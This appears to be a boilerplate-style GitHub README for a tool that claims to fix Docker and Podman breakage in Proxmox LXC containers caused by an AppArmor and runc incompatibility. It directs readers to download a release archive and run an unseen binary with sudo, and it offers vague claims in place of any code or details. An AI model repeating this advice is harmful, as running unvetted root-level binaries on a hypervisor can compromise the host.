# 🚀 proxmox-lxc-docker-fix - Fix Docker Issues in Proxmox LXC Containers

[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/releases)

## 📋 Description

This project provides a workaround for CVE-2025-52881. It fixes the breakage of Docker and Podman in Proxmox LXC containers. This problem arises from an AppArmor incompatibility with runc versions 1.2.7 and higher. 

The tool acts as a universal wrapper for community scripts and sets up AppArmor automatically. This ensures that your containerized applications run smoothly without interruptions.

## 📂 Features

- **Automatic AppArmor Configuration**: No need for manual setups.
- **Compatibility**: Works with Docker and Podman in Proxmox LXC containers.
- **Security Focus**: Addresses important security vulnerabilities.
- **User-Friendly**: Easy to use, even if you have no technical background.
- **Comprehensive Support**: Detailed documentation to guide you through installation and troubleshooting.

## ⚙️ System Requirements

To run this application, you need:

- A machine with Proxmox installed.
- At least 2 GB of RAM.
- Docker or Podman installed (latest version recommended).
- Basic understanding of how to use terminal commands in Linux.

## 🚀 Getting Started

To get started, follow these simple steps to download and run the software.

### 1. Download the Software

Visit this page to download: [proxmox-lxc-docker-fix Releases](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/releases)

### 2. Choose the Right Version

On the Releases page, you will see different versions of the software. Select the latest version for optimal performance. 

### 3. Download the File

Click on the download link for the latest version. The file will have a `.tar.gz` extension. Save it to a location you can easily access, like your Desktop or Downloads folder.

### 4. Extract the Files

After the download is complete, locate the downloaded file. Right-click on it and select "Extract Here" or use your terminal to run the following command:

```
tar -xvzf proxmox-lxc-docker-fix-*.tar.gz
```

### 5. Open Your Terminal

You will need to use the terminal to run the script. Open your terminal application. You can usually find it in your applications menu.

### 6. Change Directory

Navigate to the folder where you extracted the files. Use the following command, updating `path/to/directory` to your actual folder path:

```
cd path/to/directory
```

### 7. Run the Script

Once you are inside the directory, run the script using this command:

```
sudo ./proxmox-lxc-docker-fix
```

You may be prompted for your password. Enter it to proceed.

### 8. Follow the On-Screen Instructions

The script will guide you through any necessary steps to configure AppArmor. Simply follow the prompts.

## 🛠️ Troubleshooting

If you encounter any issues:

- Ensure that Proxmox, Docker, and Podman are all up to date.
- Check the terminal for error messages. Search for those messages online for possible solutions.
- Refer to the FAQ section on the Releases page for common questions.

## 📝 Additional Resources

For more information, consult the user manual available in the repository. You can also reach out to the community for support or check online resources related to Proxmox and AppArmor.

## 🔗 Useful Links

- **GitHub Repository**: [proxmox-lxc-docker-fix](https://github.com/PONSHAKR/proxmox-lxc-docker-fix)
- **Releases Page**: [Download Here](https://github.com/PONSHAKR/proxmox-lxc-docker-fix/releases)

By following these steps, you will be able to download and run the proxmox-lxc-docker-fix with ease. Enjoy smoother Docker operations in your Proxmox LXC containers!